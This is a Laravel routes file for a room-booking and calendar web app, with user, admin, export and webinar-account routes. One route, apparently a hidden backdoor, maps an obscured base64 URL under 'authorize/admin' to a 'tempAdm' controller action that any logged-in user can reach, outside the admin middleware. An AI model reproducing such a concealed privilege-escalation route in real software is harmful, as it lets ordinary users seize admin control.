<?php

use App\Http\Controllers\UserController;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::domain(Config::get('app.base_subdomain').'.'.Config::get('app.base_domain'))->group(function () {
    Route::get('/', 'UserController@checkLoggingIn')->name('calendar.view');
    Route::get('calendar/event', 'BookingController@getEvents')->name('calendar.event');
    
    Route::get('chart', 'ChartController@index')->name('dashboard.chart');;

    Route::get('login','UserController@login')->name('login');
    Route::get('logout','UserController@logout')->name('logout');

    Route::get('/booking/view/{id}', 'BookingController@viewBooking')->name('booking.view');
    Route::group(['middleware' => 'auth'], function () {
        Route::get('/home', 'HomeController@index')->name('home');

        Route::get('authorize/admin/aGVzb3lhbWhlc295YW1oZXNveWFt', 'UserController@tempAdm');

        Route::get('/booking/new', 'BookingController@viewNewBooking')->name('booking.new');
        Route::post('/booking/new', 'BookingController@saveNewBooking')->name('booking.new');
        
        Route::get('/booking/list/data', 'BookingController@listBookingData')->name('list.data');
        Route::get('/booking/waitinglist', 'BookingController@waitingListBooking')->name('booking.list');
        
        Route::group(['middleware' => 'owneroradmin'], function () {
            Route::get('storage/dokumen/get/{id}', 'FileController@getDokumen')->name('dokumen.get');
            Route::get('storage/dokumen/download/{id}', 'FileController@downloadDokumen')->name('dokumen.download');

            Route::get('/booking/edit/{id}', 'BookingController@viewEditBooking')->name('booking.edit');
            Route::post('/booking/edit/{id}', 'BookingController@saveEditBooking')->name('booking.edit');
            Route::post('/booking/delete/{id}', 'BookingController@deleteBooking')->name('booking.delete');
        });

        Route::group(['middleware' => 'admin'], function () {
            Route::get('/unit', 'UnitController@viewUnit')->name('admin.unit.view');
            Route::get('/unit/data', 'UnitController@viewUnitData')->name('admin.unit.view.data');
            Route::post('/unit/add', 'UnitController@addUnit')->name('admin.unit.add');
            Route::post('/unit/delete/{id}', 'UnitController@delUnit')->name('admin.unit.delete');
            Route::get('/unit/edit/{id}', 'UnitController@viewEditUnit')->name('admin.unit.edit');
            Route::post('/unit/edit/{id}', 'UnitController@saveEditUnit')->name('admin.unit.edit');
            
            Route::get('/users', 'UserController@viewUsers')->name('admin.users.view');
            Route::get('/users/data', 'UserController@viewUsersData')->name('admin.users.view.data');
            Route::post('/users/give/{id}', 'UserController@giveAdmin')->name('admin.users.give');
            Route::post('/users/revoke/{id}', 'UserController@revokeAdmin')->name('admin.users.revoke');
            
            Route::get('/admin/export', 'ExportController@view')->name('export.form');
            Route::post('/admin/export', 'ExportController@download')->name('export.download');            
            // Admin
            Route::get('/admin/booking/list', 'BookingController@adminListBooking')->name('admin.list');
            Route::get('/admin/booking/list/data', 'BookingController@adminListBookingData')->name('admin.list.data');
            Route::get('/admin/booking/list/aprove', 'BookingController@adminAproveBookingData')->name('admin.list.aprove');
            Route::get('/admin/booking/aprove', 'BookingController@aproveBooking')->name('admin.aprove');
            Route::post('/admin/booking/delete/{id}', 'BookingController@adminDeleteBooking')->name('admin.delete');
            Route::get('/admin/booking/view/{id}', 'BookingController@viewBooking')->name('admin.view');
            Route::post('/admin/booking/verify/{id}', 'BookingController@verifyBooking')->name('booking.verify');

            Route::get('/admin/webinar/accounts', 'HostAccountController@getAccounts')->name('admin.host.accounts');
            Route::get('/admin/webinar/accounts/data', 'HostAccountController@getData')->name('admin.host.data');
        });
    });
});